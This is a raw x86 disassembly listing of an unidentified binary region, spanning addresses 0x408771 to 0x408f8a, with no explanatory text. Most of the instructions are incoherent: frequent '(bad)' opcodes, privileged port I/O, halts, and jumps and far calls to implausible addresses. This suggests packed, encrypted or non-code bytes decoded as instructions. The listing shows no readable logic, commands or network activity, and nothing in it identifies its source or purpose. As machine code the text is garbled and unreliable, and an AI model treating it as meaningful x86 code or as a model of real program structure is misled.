  408771:	jne    0x40878d
  408773:	xor    ebx,DWORD PTR [eax+ecx*1-0x5c7c6403]
  40877a:	in     eax,0x34
  40877c:	inc    edx
  40877d:	add    BYTE PTR [ecx],dh
  40877f:	jae    0x4087ac
  408781:	test   BYTE PTR [ecx+0x2a],0x3
  408785:	add    BYTE PTR [ecx],dh
  408787:	or     DWORD PTR [edx-0x45],esp
  40878a:	dec    esi
  40878b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40878c:	push   ds
  40878d:	pushf  
  40878e:	xor    ebx,DWORD PTR ds:0x349283e3
  408794:	pop    esp
  408795:	inc    edx
  408796:	xor    DWORD PTR [ecx],ecx
  408798:	stos   BYTE PTR es:[edi],al
  408799:	sub    esp,DWORD PTR [edi]
  40879b:	xchg   ebx,eax
  40879c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40879d:	(bad)  
  40879e:	jmp    0x4470b4
  4087a3:	xor    edx,ebx
  4087a5:	sbb    bh,BYTE PTR [eax-0x4ee8f0]
  4087ab:	clc    
  4087ac:	push   0x59
  4087ae:	xor    DWORD PTR [eax+0x9],0x948d1960
  4087b5:	sub    BYTE PTR [ecx+ecx*1],al
  4087b8:	inc    edx
  4087b9:	jmp    0x9a8b8c1
  4087be:	xor    DWORD PTR [eax+0x9],0x94151962
  4087c5:	sub    BYTE PTR [edx+ebp*4],al
  4087c8:	adc    al,0xd1
  4087ca:	xor    BYTE PTR [eax+0x9],0xee
  4087ce:	mov    ebx,0xbce6d336
  4087d3:	xchg   edx,eax
  4087d4:	jmp    0x9071cd34
  4087d9:	fsubr  st(7),st
  4087db:	mov    ebp,0x347ce948
  4087e0:	icebp  
  4087e1:	arpl   WORD PTR [ebp+0x31],ax
  4087e4:	push   0x8f080bd
  4087e9:	jb     0x408804
  4087eb:	inc    ecx
  4087ec:	xchg   esp,eax
  4087ed:	test   al,0x3
  4087ef:	ss shl esi,1
  4087f2:	mov    ecx,0x455bf5d2
  4087f7:	xor    DWORD PTR [eax+0x48bdf3dc],edx
  4087fd:	jmp    0xe6c51b
  408802:	mov    esp,0x5c203142
  408807:	add    ah,ch
  408809:	or     al,ch
  40880b:	fwait
  40880c:	xchg   esi,eax
  40880d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40880e:	inc    edx
  408810:	hlt    
  408811:	inc    ebp
  408812:	leave  
  408813:	sub    esi,DWORD PTR [ecx]
  408815:	or     DWORD PTR [ebp+0x62],edx
  408818:	xchg   ecx,eax
  408819:	mov    al,ah
  40881b:	add    DWORD PTR [ecx+eiz*4-0x6e280101],ebx
  408822:	add    al,0x24
  408824:	pop    ecx
  408825:	xchg   esp,eax
  408826:	inc    ecx
  408827:	jmp    0x620d85c7
  40882c:	mov    al,0x47
  40882e:	add    dh,ch
  408830:	retf   0xca15
  408833:	pusha  
  408834:	ss aam 0x74
  408837:	pop    esp
  408838:	ins    DWORD PTR es:[edi],dx
  408839:	or     DWORD PTR [ecx-0x72df0e23],ecx
  40883f:	sub    BYTE PTR ds:0x4d947548,ch
  408845:	leave  
  408846:	jmp    FWORD PTR [esi+0x74049187]
  40884c:	sub    dl,BYTE PTR [edi-0x2b416bf]
  408852:	mov    WORD PTR ds:0xda00483f,?
  408858:	cs xchg esp,eax
  40885a:	cmp    al,0x77
  40885c:	cmc    
  40885d:	or     BYTE PTR [ebx],dh
  40885f:	aad    0xb1
  408861:	fmul   QWORD PTR [ebp-0x3e25cad8]
  408867:	cwde   
  408868:	jb     0x4087f9
  40886a:	add    al,0x74
  40886c:	add    BYTE PTR [esi-0x69],al
  40886f:	inc    ecx
  408870:	jmp    0x6316a462
  408875:	and    ecx,ebp
  408877:	mov    WORD PTR [eax+0x359232],gs
  40887d:	cmp    al,0x88
  40887f:	inc    ecx
  408880:	add    bl,ah
  408882:	cwde   
  408883:	daa    
  408884:	lea    ecx,[ecx+0x5435ff09]
  40888a:	mov    BYTE PTR [ecx+0x0],al
  40888d:	(bad)  
  40888e:	push   eax
  40888f:	cld    
  408890:	call   FWORD PTR [ebp-0x67]
  408893:	mov    WORD PTR [ecx+0x48],es
  408896:	es inc ebp
  408898:	clc    
  408899:	loope  0x408820
  40889b:	(bad)  
  40889c:	push   DWORD PTR [edi]
  40889e:	pop    ds
  40889f:	(bad)  
  4088a0:	mov    ecx,DWORD PTR [edi+0x5b]
  4088a3:	shl    BYTE PTR [ebx],cl
  4088a5:	dec    esi
  4088a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088a7:	push   esp
  4088a8:	cld    
  4088a9:	adc    ecx,ebx
  4088ab:	add    eax,DWORD PTR [eax*4+0x18418d91]
  4088b2:	or     al,BYTE PTR [ebp-0x8]
  4088b5:	or     eax,0x42827990
  4088ba:	jbe    0x408931
  4088bc:	cld    
  4088bd:	addr16 dec esp
  4088bf:	clc    
  4088c0:	mov    DWORD PTR ds:0x6c6c159,esp
  4088c6:	and    bh,dh
  4088c8:	mov    ebx,DWORD PTR [ebx-0x24fa3c38]
  4088ce:	rol    BYTE PTR [ecx+0x75],1
  4088d1:	add    BYTE PTR [eax+esi*1+0x76a7ffec],dl
  4088d8:	mov    eax,esi
  4088da:	push   ebx
  4088db:	mov    esi,0x9ab44533
  4088e0:	rol    DWORD PTR [ebx],0x8c
  4088e3:	and    edx,esp
  4088e5:	lea    ecx,[ecx+0xd]
  4088e8:	add    eax,DWORD PTR [ebp+0x20]
  4088eb:	or     al,0xa1
  4088ed:	jmp    0x4088e0
  4088ef:	add    bh,bh
  4088f1:	jne    0x4088d7
  4088f3:	and    eax,0x2931f845
  4088f8:	das    
  4088f9:	cld    
  4088fa:	jo     0x4088e8
  4088fc:	or     eax,0xb1176f8b
  408901:	shl    DWORD PTR [edx-0x53],0x0
  408905:	fdiv   st,st(0)
  408907:	sar    DWORD PTR fs:[ecx-0x530cbb],cl
  40890e:	mov    edx,0x455578f3
  408913:	xchg   edi,eax
  408914:	inc    esi
  408915:	cld    
  408916:	adc    ah,bl
  408918:	loopne 0x4088df
  40891a:	sub    dh,al
  40891c:	add    BYTE PTR [esp+edi*4],al
  40891f:	aad    0x7d
  408921:	inc    ecx
  408922:	xor    DWORD PTR [edi-0x1cb07ba],ebp
  408928:	outs   dx,DWORD PTR ds:[esi]
  408929:	sbb    esp,DWORD PTR [esi-0x4103c94e]
  40892f:	hlt    
  408930:	stos   DWORD PTR es:[edi],eax
  408931:	mov    DWORD PTR [esi+eax*8+0x1f00c6c2],eax
  408938:	daa    
  408939:	lods   eax,DWORD PTR ds:[esi]
  40893a:	mov    eax,DWORD PTR [edx]
  40893c:	jno    0x4088fe
  40893e:	add    eax,0x75426a32
  408943:	cli    
  408944:	mov    BYTE PTR [edi+0x785adeff],bl
  40894a:	(bad)  
  40894b:	stos   BYTE PTR es:[edi],al
  40894c:	jp     0x40893e
  40894e:	inc    esp
  40894f:	int    0xbe
  408951:	rol    DWORD PTR [ebx],0x2d
  408954:	xor    eax,0xb2708e37
  408959:	add    BYTE PTR [ebp-0x47],al
  40895c:	lods   al,BYTE PTR ds:[esi]
  40895d:	aad    0xc1
  40895f:	adc    ebx,DWORD PTR [eax-0x54]
  408962:	jne    0x408909
  408964:	xor    al,BYTE PTR [esi-0x8]
  408967:	test   al,0x9c
  408969:	scas   eax,DWORD PTR es:[edi]
  40896a:	shr    DWORD PTR [edi-0x2d],0x78
  40896e:	(bad)  
  40896f:	mov    edx,0x72c25a08
  408974:	or     eax,0x1df0cbea
  408979:	cmp    DWORD PTR [edx],eax
  40897b:	adc    al,0xe9
  40897d:	pop    ebx
  40897e:	inc    edx
  40897f:	xor    DWORD PTR [edx],ecx
  408981:	cld    
  408982:	out    0xb5,eax
  408984:	dec    ecx
  408985:	jmp    0x6431a58c
  40898a:	inc    edx
  40898b:	xor    DWORD PTR [eax+0xe30afa4],edx
  408991:	aad    0x7e
  408993:	lock or BYTE PTR [edx+0x46],dh
  408997:	cmp    DWORD PTR [ecx],ecx
  408999:	in     al,dx
  40899a:	repz add BYTE PTR [ebp-0xd4516b7],ah
  4089a1:	cmp    al,0x72
  4089a3:	lahf   
  4089a4:	es sbb eax,0xd2579bf1
  4089aa:	jmp    0xeee23bb2
  4089af:	xor    eax,0xfc5ca257
  4089b4:	push   cs
  4089b5:	add    ebp,DWORD PTR [esi-0x56f1cefc]
  4089bb:	xor    DWORD PTR [esi],ebp
  4089bd:	popa   
  4089be:	into   
  4089bf:	stos   DWORD PTR es:[edi],eax
  4089c0:	out    dx,al
  4089c1:	mov    ds:0x49ba17d2,al
  4089c6:	in     eax,dx
  4089c7:	xchg   ebx,eax
  4089c8:	sub    cl,cl
  4089ca:	cmp    al,0x3
  4089cc:	cdq    
  4089cd:	mov    ds:0xaeceabae,al
  4089d2:	in     eax,dx
  4089d3:	jle    0x408a06
  4089d5:	mov    gs,ecx
  4089d7:	mov    esp,0x50e90df3
  4089dc:	stos   BYTE PTR es:[edi],al
  4089dd:	mov    ch,0x6a
  4089df:	shl    BYTE PTR [ecx+0x1bceba36],0xb
  4089e6:	adc    eax,DWORD PTR ds:0x8100070b
  4089ec:	mov    edx,0xb7e900d3
  4089f1:	mov    eax,ds:0xae2cdcff
  4089f6:	bound  esi,QWORD PTR [edx+0x6d]
  4089f9:	das    
  4089fa:	adc    BYTE PTR [eax+esi*8-0x68],ah
  4089fe:	push   eax
  4089ff:	inc    ecx
  408a00:	add    BYTE PTR [eax],dl
  408a02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a03:	inc    DWORD PTR [esi+0x13]
  408a06:	retf   0x3945
  408a09:	aaa    
  408a0a:	or     DWORD PTR [ebx-0x3274bd5c],ecx
  408a10:	(bad)  
  408a11:	int    0x53
  408a13:	repnz push 0x18
  408a16:	adc    eax,0x8e319500
  408a1b:	inc    ebp
  408a1c:	in     eax,0x97
  408a1e:	add    al,BYTE PTR [ebx+0x74a2268c]
  408a24:	repz scas eax,DWORD PTR es:[edi]
  408a26:	and    ecx,DWORD PTR [eax]
  408a28:	jmp    0xcd2b978e
  408a2d:	mov    bh,0x11
  408a2f:	push   DWORD PTR [edx+ecx*1-0x56]
  408a33:	ins    BYTE PTR es:[edi],dx
  408a34:	out    0xdb,al
  408a36:	mov    eax,ds:0x1bcbe183
  408a3b:	add    al,dl
  408a3d:	es nop
  408a3f:	inc    ebp
  408a40:	aad    0x4c
  408a42:	stc    
  408a43:	mov    WORD PTR [ebx*4-0x522eacc8],gs
  408a4a:	rol    BYTE PTR [eax],cl
  408a4c:	jmp    0x35402b00
  408a51:	int    0x36
  408a53:	call   0x4912d5
  408a58:	(bad)  
  408a5a:	(bad)  
  408a5b:	ret    
  408a5c:	xor    dh,BYTE PTR [esi+eax*8+0xc]
  408a60:	jmp    0x12d1866
  408a65:	add    BYTE PTR [ebx+0x36],cl
  408a68:	cmp    DWORD PTR [ebp+0x78],0x5
  408a6c:	jne    0x408a79
  408a6e:	pusha  
  408a6f:	or     eax,0x4e980000
  408a74:	pop    ebx
  408a75:	leave  
  408a76:	pop    edx
  408a77:	call   0xba:0x995d8aff
  408a7e:	mov    BYTE PTR ds:0x6e586a00,al
  408a84:	jne    0x408a96
  408a86:	(bad)  
  408a87:	outs   dx,BYTE PTR ds:[esi]
  408a88:	jne    0x408a92
  408a8a:	add    cl,ch
  408a8c:	int    0x0
  408a8e:	dec    eax
  408a8f:	mov    al,al
  408a91:	jle    0x408af7
  408a93:	or     bh,al
  408a95:	sub    DWORD PTR [ebp+0x387d82f5],edx
  408a9b:	add    eax,0xce30775
  408aa0:	add    BYTE PTR [eax],al
  408aa2:	sbb    BYTE PTR [eax+0x1f52eb02],al
  408aa8:	ret    
  408aa9:	pop    edi
  408aaa:	rcr    DWORD PTR [ebp-0x3e],cl
  408aad:	or     al,0x8
  408aaf:	cmp    cl,BYTE PTR [ebx-0xb9f6614]
  408ab5:	dec    BYTE PTR [edi]
  408ab7:	jae    0x408ab8
  408ab9:	jne    0x408ac7
  408abb:	and    al,BYTE PTR [ebp-0x8d210c]
  408ac1:	(bad)  
  408ac2:	push   ebp
  408ac3:	ins    DWORD PTR es:[edi],dx
  408ac4:	(bad)  
  408ac5:	(bad)  
  408ac6:	out    dx,eax
  408ac7:	add    eax,0xc8000000
  408acc:	leave  
  408acd:	test   esp,edi
  408acf:	sahf   
  408ad0:	jb     0x408ad1
  408ad2:	add    eax,ebx
  408ad4:	or     al,0x0
  408ad6:	lea    edx,[ebp+0x5]
  408ad9:	(bad)  
  408ada:	call   FWORD PTR [edi+0x31087572]
  408ae0:	daa    
  408ae1:	add    al,0x8d
  408ae3:	mov    ah,0x76
  408ae5:	stos   BYTE PTR es:[edi],al
  408ae6:	jmp    DWORD PTR [esi+0xb001e02]
  408aec:	mov    dl,0x76
  408aee:	test   DWORD PTR [ebp-0x1e0056e8],edx
  408af4:	or     eax,DWORD PTR [eax+ebp*8]
  408af7:	xor    al,bl
  408af9:	add    eax,DWORD PTR [eax]
  408afb:	mov    dl,0x2a
  408afd:	test   eax,0xc3ab2d74
  408b02:	jne    0x408b39
  408b04:	add    eax,esp
  408b06:	jmp    0x408b34
  408b08:	mov    al,BYTE PTR [ebx]
  408b0a:	add    BYTE PTR [ecx],dh
  408b0c:	mov    dl,0xba
  408b0e:	ret    0xb229
  408b11:	dec    esi
  408b12:	mov    ebx,DWORD PTR [ebp+0x33]
  408b15:	sar    ah,0xe2
  408b18:	mov    edx,0xfedb6acc
  408b1d:	or     BYTE PTR cs:[ecx+0x25],cl
  408b21:	test   eax,0xc3ab2eff
  408b26:	je     0x408ba5
  408b28:	jl     0x408b77
  408b2a:	jmp    DWORD PTR [edx+ebx*4+0x16007f9b]
  408b31:	xchg   edi,eax
  408b32:	test   al,0xb
  408b34:	icebp  
  408b35:	adc    al,0x5
  408b37:	jmp    0x408ba6
  408b39:	cmp    al,0x4
  408b3b:	push   0x30
  408b3d:	sub    eax,0xb761ff3e
  408b42:	cs or  cl,bl
  408b45:	jnp    0x408afd
  408b47:	add    BYTE PTR [ecx],dh
  408b49:	sub    eax,0x1b217ec3
  408b4e:	ds adc al,0x19
  408b51:	in     eax,dx
  408b52:	test   al,0x75
  408b54:	xor    esp,DWORD PTR [ebx]
  408b56:	add    cl,BYTE PTR [ebx+0x7cf5095c]
  408b5c:	and    esi,DWORD PTR [ebx]
  408b5e:	jmp    0x2ccebb80
  408b63:	test   eax,0xf814a001
  408b68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b69:	cmp    bl,cl
  408b6b:	test   al,0x24
  408b6d:	or     eax,0x9f795c91
  408b72:	jbe    0x408b60
  408b74:	cmc    
  408b75:	clc    
  408b76:	cli    
  408b77:	add    eax,0xcc6c049a
  408b7c:	add    eax,0xdac4726d
  408b81:	shr    DWORD PTR [ebx],1
  408b83:	rdtsc  
  408b85:	bound  edx,QWORD PTR ss:[edi-0x54163b50]
  408b8c:	pop    esi
  408b8d:	lahf   
  408b8e:	call   0xa8:0x93327bdc
  408b95:	les    edx,FWORD PTR [eax]
  408b97:	inc    ecx
  408b98:	or     eax,DWORD PTR [esi-0x61]
  408b9b:	es cld 
  408b9d:	jle    0x408bb3
  408b9f:	xchg   BYTE PTR ds:0xfb9c9fdb,bl
  408ba5:	push   ss
  408ba6:	adc    al,0xe
  408ba8:	test   al,0x26
  408baa:	adc    ebp,DWORD PTR [ecx]
  408bac:	xor    esi,DWORD PTR cs:[edx-0x66b7d6a]
  408bb3:	call   0x77df9ab3
  408bb8:	add    cl,cl
  408bba:	or     ecx,esi
  408bbc:	add    esi,DWORD PTR [ecx]
  408bbe:	mov    dl,0xea
  408bc0:	jp     0x408c2e
  408bc2:	stc    
  408bc3:	inc    edx
  408bc4:	add    al,0x81
  408bc6:	mov    WORD PTR [esp+eax*1-0x17],fs
  408bca:	sahf   
  408bcb:	(bad)  
  408bcc:	push   esp
  408bcd:	ficom  WORD PTR [ecx+esi*8]
  408bd0:	fwait
  408bd1:	and    esp,ecx
  408bd3:	add    cl,ch
  408bd5:	xor    al,BYTE PTR [eax+eax*8+0x2cb23330]
  408bdc:	sbb    al,0x32
  408bde:	dec    edx
  408bdf:	jmp    0x408ba7
  408be1:	bound  edx,QWORD PTR [edx-0x4d41aab]
  408be7:	imul   ebp,ecx,0xe9858c02
  408bed:	retf   0xff9e
  408bf0:	sbb    esi,ecx
  408bf2:	adc    al,0xc
  408bf4:	jbe    0x408bd9
  408bf6:	clc    
  408bf7:	push   edi
  408bf8:	rol    BYTE PTR [eax],0xf1
  408bfb:	clc    
  408bfc:	and    ah,0x22
  408bff:	or     DWORD PTR [ebp-0x16],esi
  408c02:	repz mov cl,0x4
  408c05:	ins    BYTE PTR es:[edi],dx
  408c06:	jp     0x408c1d
  408c08:	cdq    
  408c09:	bound  esi,QWORD PTR [edx+0x42]
  408c0c:	leave  
  408c0d:	sub    ebx,DWORD PTR [ecx-0x62]
  408c10:	push   esp
  408c11:	jb     0x408bcc
  408c13:	mov    al,ah
  408c15:	xor    esi,edi
  408c17:	fsin   
  408c19:	ret    
  408c1a:	xor    dh,BYTE PTR [esi]
  408c1c:	call   FWORD PTR [edx+edi*1-0x71c93b5a]
  408c23:	sahf   
  408c24:	(bad)  
  408c25:	lods   al,BYTE PTR ds:[esi]
  408c26:	(bad)  
  408c27:	or     BYTE PTR [eax],al
  408c29:	jmp    0xf1961e60
  408c2e:	fwait
  408c2f:	sti    
  408c30:	mov    WORD PTR [edx+ecx*8-0x761295c8],fs
  408c37:	inc    esp
  408c38:	cld    
  408c39:	cdq    
  408c3a:	iret   
  408c3b:	adc    ecx,DWORD PTR [eax]
  408c3d:	out    0x60,al
  408c3f:	or     eax,0x9d496847
  408c44:	or     eax,0x740fe9e3
  408c49:	jecxz  0x408bfe
  408c4b:	sbb    edi,eax
  408c4d:	add    al,cl
  408c4f:	fmul   st,st(0)
  408c51:	xor    ecx,DWORD PTR [eax-0x6074fa7e]
  408c57:	mov    al,al
  408c59:	add    esi,DWORD PTR [edi]
  408c5b:	pop    esp
  408c5c:	ret    0x4
  408c5f:	enter  0x8b38,0xec
  408c63:	dec    ebx
  408c64:	pop    esi
  408c65:	hlt    
  408c66:	push   ebx
  408c67:	outs   dx,DWORD PTR ds:[esi]
  408c68:	std    
  408c69:	xchg   edi,eax
  408c6a:	cmp    bl,BYTE PTR [eax-0x281317f7]
  408c70:	dec    WORD PTR [ecx+0x458d714d]
  408c77:	or     al,0x3a
  408c79:	call   0xffa72ba7
  408c7e:	xor    esi,ebx
  408c80:	call   FWORD PTR ds:0x1826a
  408c86:	cli    
  408c87:	pop    eax
  408c88:	or     edi,edi
  408c8a:	jne    0x408c88
  408c8c:	data16 jne 0x408c97
  408c8f:	add    BYTE PTR [esi],bl
  408c91:	(bad)  
  408c92:	call   DWORD PTR [edi]
  408c94:	mov    eax,eax
  408c96:	paddusb mm3,QWORD PTR [ecx+0x66580000]
  408c9d:	jne    0x408c93
  408c9f:	and    bh,ah
  408ca1:	(bad)  
  408ca2:	call   DWORD PTR [edi]
  408ca4:	mov    cl,0xff
  408ca6:	stc    
  408ca7:	sbb    BYTE PTR [ecx],cl
  408ca9:	jbe    0x408cb0
  408cab:	xor    DWORD PTR [ecx+eax*1],eax
  408cae:	add    BYTE PTR [eax],cl
  408cb0:	fs jne 0x408ca7
  408cb3:	inc    eax
  408cb4:	push   edx
  408cb5:	(bad)  
  408cb6:	inc    DWORD PTR [edi]
  408cb8:	sbb    eax,0x634c74c0
  408cbd:	jne    0x408cb3
  408cbf:	loopne 0x408ce2
  408cc1:	fcos   
  408cc3:	add    bh,dl
  408cc5:	and    dl,BYTE PTR [ebp-0xc]
  408cc8:	xor    DWORD PTR [edi],esp
  408cca:	adc    ch,BYTE PTR [edx+0x31]
  408ccd:	dec    edx
  408cce:	lock and BYTE PTR [ecx],dh
  408cd1:	mov    dl,0xa4
  408cd3:	jne    0x408caa
  408cd5:	pop    ebx
  408cd6:	das    
  408cd7:	hlt    
  408cd8:	into   
  408cd9:	add    al,bh
  408cdb:	(bad)  
  408cdc:	ins    BYTE PTR es:[edi],dx
  408cdd:	pop    edx
  408cde:	add    al,0x0
  408ce0:	xor    DWORD PTR [edx-0xe99e4e5],esi
  408ce6:	add    edi,edi
  408ce8:	and    al,0x76
  408cea:	pushf  
  408ceb:	into   
  408cec:	jp     0x408ca0
  408cee:	add    edx,DWORD PTR [ebx+0x2a]
  408cf1:	jb     0x408d23
  408cf3:	ss stos BYTE PTR es:[edi],al
  408cf5:	mov    bl,BYTE PTR [ebx+ebx*1]
  408cf8:	(bad)  
  408cf9:	lock add ebp,eax
  408cfc:	es push 0x2a320004
  408d02:	dec    ebp
  408d03:	inc    edi
  408d04:	stos   BYTE PTR es:[edi],al
  408d05:	fld    TBYTE PTR [edx-0x6c]
  408d08:	inc    eax
  408d09:	mov    dl,0x3
  408d0b:	mov    al,0x34
  408d0d:	inc    eax
  408d0e:	push   esi
  408d0f:	mov    eax,0x3c1c5
  408d14:	or     dh,cl
  408d16:	mov    ebp,0x4cb24e47
  408d1b:	push   ebx
  408d1c:	pop    ecx
  408d1d:	mov    bh,BYTE PTR [ecx+0x3f193100]
  408d23:	clc    
  408d24:	(bad)  
  408d25:	jecxz  0x408d63
  408d27:	inc    DWORD PTR [eax]
  408d29:	cmp    al,0x53
  408d2b:	dec    eax
  408d2c:	push   0x427b5a
  408d31:	push   ds
  408d32:	sbb    eax,0xd6ace8a7
  408d37:	add    eax,DWORD PTR [eax]
  408d39:	bound  esp,QWORD PTR [edi+0x276d74c3]
  408d3f:	lods   al,BYTE PTR ds:[esi]
  408d40:	push   0x4336094a
  408d45:	xor    DWORD PTR [ecx+0x931bab7],esi
  408d4b:	jmp    0x98c4:0x62447eab
  408d52:	je     0x408d2c
  408d54:	add    esi,DWORD PTR [ecx]
  408d56:	pop    ecx
  408d57:	in     al,dx
  408d58:	mov    cl,0x9f
  408d5a:	pusha  
  408d5b:	pop    ebp
  408d5c:	adc    dh,BYTE PTR [ecx]
  408d5e:	or     DWORD PTR [edx],eax
  408d60:	ret    
  408d61:	test   DWORD PTR [ebx-0x5a],0x91385e03
  408d68:	pusha  
  408d69:	lahf   
  408d6a:	fwait
  408d6b:	xchg   esi,eax
  408d6c:	js     0x408d6a
  408d6e:	clc    
  408d6f:	loope  0x408d42
  408d71:	and    eax,0x8a017005
  408d76:	add    bl,BYTE PTR [ecx]
  408d78:	pushf  
  408d79:	jg     0x408d35
  408d7b:	jbe    0x408d21
  408d7d:	out    0xc2,al
  408d7f:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  408d81:	sub    al,0x3c
  408d83:	ret    0xfca4
  408d86:	xchg   esp,eax
  408d87:	push   ecx
  408d88:	fisttp DWORD PTR [ecx+0x80569b]
  408d8e:	in     al,0xa0
  408d90:	jmp    0xad04c3c1
  408d95:	stos   DWORD PTR es:[edi],eax
  408d96:	xor    DWORD PTR [ecx],ecx
  408d98:	mov    DWORD PTR [ebx],eax
  408d9a:	dec    esi
  408d9b:	adc    eax,0x94bca431
  408da0:	cs sub DWORD PTR cs:[ecx-0x64c959f2],esi
  408da8:	push   ds
  408da9:	cs and eax,0x26cd91b2
  408daf:	fwait
  408db0:	loop   0x408d75
  408db2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408db3:	pop    es
  408db4:	adc    cl,BYTE PTR [eax]
  408db6:	sub    cl,cl
  408db8:	jne    0x408dc6
  408dba:	mov    edx,0x7efd0034
  408dbf:	idiv   esi
  408dc1:	je     0x408dc9
  408dc3:	pushf  
  408dc4:	jne    0x408da3
  408dc6:	shl    BYTE PTR [edi],cl
  408dc8:	xor    al,0x64
  408dca:	cmc    
  408dcb:	and    DWORD PTR ds:0x92c92,eax
  408dd1:	jmp    0x7334c285
  408dd6:	fistp  WORD PTR [ebx+0x3792b575]
  408ddc:	or     BYTE PTR [esi+0x41e89d28],dh
  408de2:	repz call 0xb05b:0x3aee72ff
  408dea:	ja     0x408df9
  408dec:	add    BYTE PTR [esi+esi*4],bh
  408def:	lods   eax,DWORD PTR ds:[esi]
  408df0:	and    DWORD PTR [ebp+0x53320500],0xffffffd2
  408df7:	xlat   BYTE PTR ds:[ebx]
  408df8:	xor    DWORD PTR [eax],eax
  408dfa:	leave  
  408dfb:	xor    cl,BYTE PTR [ecx]
  408dfd:	call   0xffdb010c
  408e02:	pusha  
  408e03:	call   0x9329f6a4
  408e08:	call   0x56ff:0xbb2b51ff
  408e0f:	mov    ah,0x44
  408e11:	mov    ah,0xc1
  408e13:	xor    ch,cl
  408e15:	(bad)  
  408e16:	call   0x3f1edea5
  408e1b:	xchg   edx,eax
  408e1c:	nop
  408e1d:	inc    ebp
  408e1e:	jne    0x408dc0
  408e20:	sbb    al,0xc0
  408e22:	jo     0x408e75
  408e24:	call   0x53f3:0x5a5fe9ff
  408e2b:	cli    
  408e2c:	inc    ebx
  408e2d:	rcl    ch,0x32
  408e30:	or     DWORD PTR [eax],eax
  408e32:	es push 0xf00ffb5
  408e38:	push   es
  408e39:	add    bh,al
  408e3b:	aad    0x75
  408e3d:	call   FWORD PTR [edi]
  408e3f:	sbb    BYTE PTR [esi],al
  408e41:	push   DWORD PTR [ebp+0xc]
  408e44:	ja     0x408e8b
  408e46:	ror    BYTE PTR [edi],1
  408e48:	add    DWORD PTR [edi+ecx*4+0x458d5915],esi
  408e4f:	cwde   
  408e50:	aad    0x67
  408e52:	add    al,cl
  408e54:	add    eax,0xc8006a80
  408e59:	data16 jne 0x408e64
  408e5c:	loopne 0x408e3c
  408e5e:	leave  
  408e5f:	add    al,bl
  408e61:	or     al,al
  408e63:	je     0x408e3b
  408e65:	cmp    BYTE PTR [ebp-0x30],0xc8
  408e69:	add    BYTE PTR ds:0x5dee9,al
  408e6f:	add    bh,dl
  408e71:	push   eax
  408e72:	mov    al,0xff
  408e74:	pop    DWORD PTR ds:0x35458d00
  408e7a:	push   eax
  408e7b:	inc    DWORD PTR [ebp-0x67ff97c7]
  408e81:	add    eax,0xc5558d80
  408e86:	push   eax
  408e87:	call   0x4159a6
  408e8c:	arpl   bp,ax
  408e8e:	jne    0x408e95
  408e90:	icebp  
  408e91:	sub    al,0x0
  408e93:	add    BYTE PTR [eax-0x76],cl
  408e96:	inc    ebp
  408e97:	mov    ah,0x6
  408e99:	push   es
  408e9a:	add    BYTE PTR [ebp+0x3cb9c58d],cl
  408ea0:	pop    eax
  408ea1:	add    eax,0x73083300
  408ea6:	stos   BYTE PTR es:[edi],al
  408ea7:	mov    DWORD PTR [ebp+0x18003cc5],0x3175ff0d
  408eb1:	ss xchg edx,eax
  408eb3:	inc    ebp
  408eb4:	or     eax,0x16d447f0
  408eb9:	mov    al,0x3
  408ebb:	add    BYTE PTR [eax],al
  408ebd:	imul   BYTE PTR [ebp-0x6d]
  408ec0:	jmp    DWORD PTR [esi]
  408ec2:	mov    ds:0xe2748d03,al
  408ec7:	xor    ch,BYTE PTR [edx+0x31]
  408eca:	cmp    al,0x4
  408ecc:	jmp    DWORD PTR [esi+esi*2-0x54]
  408ed0:	out    0xf8,al
  408ed2:	mov    ds:0x3ef10b03,al
  408ed7:	or     al,BYTE PTR [ebx+0x75047254]
  408edd:	xor    edi,DWORD PTR [ebx+0x5e3cff24]
  408ee3:	mov    eax,ds:0xd74a8575
  408ee8:	dec    esi
  408ee9:	jo     0x408e8d
  408eeb:	mov    al,ds:0x1b7aed75
  408ef0:	leave  
  408ef1:	xor    DWORD PTR [edx-0x48be3b7c],esp
  408ef7:	pop    eax
  408ef8:	inc    ebp
  408ef9:	jns    0x408eed
  408efb:	sub    eax,0x9f9d8e00
  408f00:	call   0xffe1ab9c
  408f05:	sub    ah,BYTE PTR [edx+0x17]
  408f08:	add    cl,BYTE PTR [edx-0x56ba750b]
  408f0e:	aaa    
  408f0f:	pop    ss
  408f10:	mov    esp,0xcb9459
  408f15:	xor    DWORD PTR [edx-0x60],edx
  408f18:	jne    0x408eaf
  408f1a:	dec    edi
  408f1b:	pop    ss
  408f1c:	mov    eax,0xff9c7d59
  408f21:	add    BYTE PTR [esi-0x55],al
  408f24:	ret    
  408f25:	jne    0x408f5a
  408f27:	dec    ebx
  408f28:	hlt    
  408f29:	(bad)  
  408f2a:	mov    esp,0xa4a0f908
  408f2f:	add    eax,0xa0e9171e
  408f34:	fcomp  QWORD PTR [esi-0x439d67e2]
  408f3a:	push   ss
  408f3b:	push   ds
  408f3c:	inc    ecx
  408f3d:	lods   al,BYTE PTR ds:[esi]
  408f3e:	repz shr ecx,0x3
  408f42:	push   es
  408f43:	push   ds
  408f44:	cmp    eax,0xeeb62bac
  408f49:	mov    al,ds:0xaba51df6
  408f4e:	xor    esi,DWORD PTR [esi+0x1de6a0de]
  408f54:	aad    0xab
  408f56:	(bad)  [esi+ecx*8+0x22cbaaa0]
  408f5d:	inc    ecx
  408f5e:	clc    
  408f5f:	retf   0x3ed
  408f62:	pop    esp
  408f63:	test   ch,al
  408f65:	test   ch,dh
  408f67:	xchg   esp,eax
  408f68:	bound  eax,QWORD PTR [esi+0x25]
  408f6b:	add    al,0xa9
  408f6d:	pop    ss
  408f6e:	aaa    
  408f6f:	shr    cl,1
  408f71:	add    esi,DWORD PTR [ecx]
  408f73:	or     ecx,ebp
  408f75:	enter  0x94f4,0xe9
  408f79:	add    esi,DWORD PTR [ecx]
  408f7b:	or     DWORD PTR [esi+eax*2-0x73],esi
  408f7f:	cmp    BYTE PTR [esi+0x16],bh
  408f82:	xor    eax,0xbfc98
  408f87:	mov    DWORD PTR [ecx],esp
  408f89:	outs   dx,DWORD PTR ds:[esi]
  408f8a:	mov    al,ds:0x9fe48b76
